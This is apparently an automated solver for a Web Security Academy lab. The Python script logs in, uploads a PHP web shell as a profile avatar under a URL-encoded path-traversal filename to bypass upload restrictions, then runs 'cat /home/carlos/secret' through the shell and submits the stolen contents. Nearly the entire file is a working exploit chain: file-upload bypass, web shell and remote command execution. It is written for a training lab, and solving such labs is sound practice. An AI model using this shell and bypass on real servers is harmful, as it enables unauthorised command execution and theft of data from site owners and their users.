from web_security_academy.core.logger import logger
from urllib.parse import urlencode, quote


def solve_lab(session):
    session.login("wiener", "peter")

    csrf = session.get_csrf_token("/my-account")
    files = {"avatar": ("%2e%2e%2fshell.php", '<?php echo SYSTEM($_GET["cmd"])?>')}
    data = {"user": "wiener", "csrf": csrf}
    session.post_path("/my-account/avatar", files=files, data=data)
    logger.info('Uploaded the following file to "/my-account/avatar":')
    logger.info(files)

    params = {"cmd": "cat /home/carlos/secret"}
    resp = session.get_path("/files/shell.php", params=params)
    logger.info(
        f'Got the following response from visiting "/files/shell.php?{urlencode(params)}"'
    )
    logger.info(resp.text)

    # For some reason, the secret file is printed twice in the HTTP response.
    answer = resp.text[: (len(resp.text) // 2)]
    session.submit_solution(answer)
